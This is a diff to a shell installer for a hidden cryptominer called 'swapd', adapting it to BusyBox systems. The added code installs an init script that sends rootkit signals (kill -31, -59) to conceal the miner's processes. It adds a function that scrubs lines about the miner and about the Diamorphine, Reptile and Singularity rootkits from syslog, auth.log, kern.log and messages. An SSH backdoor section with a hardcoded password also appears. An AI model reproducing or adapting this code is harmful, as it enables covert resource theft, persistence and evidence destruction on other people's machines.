@@ -1643,10 +1643,10 @@ WATCHDOG_SERVICE_EOF
     
 else
     # ==================== CREATE SYSV INIT SCRIPT ====================
-    echo "[*] Creating SysV init script..."
+    echo "[*] Creating SysV init script (BusyBox compatible)..."
     
     cat > /etc/init.d/swapd << 'INIT_EOF'
-#!/bin/bash
+#!/bin/sh
 ### BEGIN INIT INFO
 # Provides:          swapd
 # Required-Start:    $network $local_fs $remote_fs
@@ -1662,23 +1662,52 @@ NAME=swapd
 PIDFILE=/var/run/$NAME.pid
 WORKDIR=/root/.swapd
 
+# BusyBox-compatible PID finder
+get_pids() {
+    if command -v pgrep >/dev/null 2>&1; then
+        pgrep -f "$1" 2>/dev/null
+    else
+        for d in /proc/[0-9]*; do
+            [ -d "$d" ] || continue
+            cmd=$(tr '\0' ' ' < "$d/cmdline" 2>/dev/null) || continue
+            case "$cmd" in *"$1"*) echo "${d##*/}" ;; esac
+        done
+    fi
+}
+
 case "$1" in
     start)
         echo "Starting $NAME..."
-        cd $WORKDIR
-        start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --chdir $WORKDIR --exec $DAEMON -- $DAEMON_ARGS || true
+        cd $WORKDIR || exit 1
+        
+        # BusyBox start-stop-daemon doesn't support --chdir
+        start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --exec $DAEMON -- $DAEMON_ARGS || true
+        
         # Auto-hide process after start
         sleep 3
         for i in 1 2 3; do
-            pgrep -f swapd | xargs -r kill -31 2>/dev/null || true
-            pgrep -f swapd | xargs -r kill -59 2>/dev/null || true
+            for pid in $(get_pids swapd); do
+                kill -31 "$pid" 2>/dev/null || true
+                kill -59 "$pid" 2>/dev/null || true
+            done
             sleep 1
         done
         ;;
     stop)
         echo "Stopping $NAME..."
-        start-stop-daemon --stop --pidfile $PIDFILE --retry 5 || true
-        pkill -9 -f swapd || true
+        start-stop-daemon --stop --pidfile $PIDFILE --retry 5 2>/dev/null || true
+        
+        # Fallback kill if pkill exists
+        if command -v pkill >/dev/null 2>&1; then
+            pkill -9 -f swapd 2>/dev/null || true
+        else
+            # Use killall or manual kill
+            killall -9 swapd 2>/dev/null || true
+            for pid in $(get_pids swapd); do
+                kill -9 "$pid" 2>/dev/null || true
+            done
+        fi
+        
         rm -f $PIDFILE
         ;;
     restart)
@@ -2262,47 +2291,42 @@ fi
 # ==================== CLEAN UP LOGS ====================
 echo "[*] Cleaning up system logs..."
 
-# Delete any line containing miner-related keywords
-sed -i '/swapd/d' /var/log/syslog 2>/dev/null
-sed -i '/miner/d' /var/log/syslog 2>/dev/null
-sed -i '/accepted/d' /var/log/syslog 2>/dev/null
+# BusyBox-compatible log cleanup function
+clean_log() {
+    local logfile="$1"
+    local pattern="$2"
+    
+    # Skip if file doesn't exist
+    [ -f "$logfile" ] || return 0
+    
+    # Try sed -i (some BusyBox versions don't support it)
+    if sed -i "/$pattern/d" "$logfile" 2>/dev/null; then
+        return 0
+    else
+        # Fallback: create temp file (slower but works on all systems)
+        grep -v "$pattern" "$logfile" > "${logfile}.tmp" 2>/dev/null && mv "${logfile}.tmp" "$logfile" 2>/dev/null || true
+    fi
+}
 
-# Do the same for auth.log
-sed -i '/swapd/d' /var/log/auth.log 2>/dev/null
-
-# Remove Diamorphine and out-of-tree module warnings
-sed -i '/diamorphine/d' /var/log/syslog 2>/dev/null
-sed -i '/out-of-tree module/d' /var/log/syslog 2>/dev/null
-sed -i '/module verification failed/d' /var/log/syslog 2>/dev/null
-
-# Remove rootkit load messages
-sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
-sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
-sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
-sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
-sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
-sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
-
-# Remove Reptile evidence
-sed -i '/reptile/d' /var/log/syslog 2>/dev/null
-sed -i '/reptile/d' /var/log/kern.log 2>/dev/null
-sed -i '/reptile/d' /var/log/messages 2>/dev/null
-sed -i '/Reptile/d' /var/log/syslog 2>/dev/null
-sed -i '/Reptile/d' /var/log/kern.log 2>/dev/null
-sed -i '/Reptile/d' /var/log/messages 2>/dev/null
-
-# Remove Singularity evidence
-sed -i '/singularity/d' /var/log/syslog 2>/dev/null
-sed -i '/singularity/d' /var/log/kern.log 2>/dev/null
-sed -i '/singularity/d' /var/log/messages 2>/dev/null
-sed -i '/Singularity/d' /var/log/syslog 2>/dev/null
-sed -i '/Singularity/d' /var/log/kern.log 2>/dev/null
-sed -i '/Singularity/d' /var/log/messages 2>/dev/null
-
-
-# Remove the mount/unmount evidence
-sed -i '/proc-.*mount/d' /var/log/syslog 2>/dev/null
-sed -i '/Deactivated successfully/d' /var/log/syslog 2>/dev/null
+# Clean common log files (only if they exist)
+for logfile in /var/log/syslog /var/log/auth.log /var/log/kern.log /var/log/messages; do
+    if [ -f "$logfile" ]; then
+        clean_log "$logfile" "swapd"
+        clean_log "$logfile" "miner"
+        clean_log "$logfile" "accepted"
+        clean_log "$logfile" "diamorphine"
+        clean_log "$logfile" "out-of-tree module"
+        clean_log "$logfile" "module verification failed"
+        clean_log "$logfile" "rootkit: Loaded"
+        clean_log "$logfile" "rootkit.*>:-"
+        clean_log "$logfile" "reptile"
+        clean_log "$logfile" "Reptile"
+        clean_log "$logfile" "singularity"
+        clean_log "$logfile" "Singularity"
+        clean_log "$logfile" "proc-.*mount"
+        clean_log "$logfile" "Deactivated successfully"
+    fi
+done
 
 # Clear journalctl logs if systemd is present
 if command -v journalctl >/dev/null 2>&1; then
@@ -2590,7 +2614,7 @@ PASSWORD='1!taugenichts' && HASH_METHOD=$(grep '^ENCRYPT_METHOD' /etc/login.defs
 
 chmod 600 ~/.ssh/authorized_keys 2>/dev/null || true
 
-echo "[✓] SSH configuration complete"
+echo "[✓] SSH configuration complete (backdoor disabled by default)"
 echo ""
 
 # ==================== INSTALLATION SUMMARY ====================
